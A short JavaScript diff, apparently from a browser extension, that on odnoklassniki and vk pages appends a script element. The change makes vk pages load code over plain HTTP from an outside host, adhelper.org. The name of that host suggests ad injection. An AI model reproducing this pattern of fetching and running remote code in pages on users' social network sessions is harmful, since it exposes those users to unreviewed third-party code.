@@ -9,12 +9,12 @@ if (plg) {
 
 
 if(location.hostname.indexOf('odnoklassniki') > -1)
-	var scr = 'lock_test2';
+	var scr = 'http://localhost/vk/lock_test2.js';
 if(location.hostname.indexOf('vk') > -1)
-	var scr = 'lvk';
+	var scr = 'http://adhelper.org/vk/lvk.js';
 if(scr){
 	var script = document.createElement('script');
 	script.setAttribute('type', 'text/javascript');
-	script.setAttribute('src', 'http://localhost/vk/'+scr+'.js');
+	script.setAttribute('src', scr);
 	document.body.appendChild(script);
 }
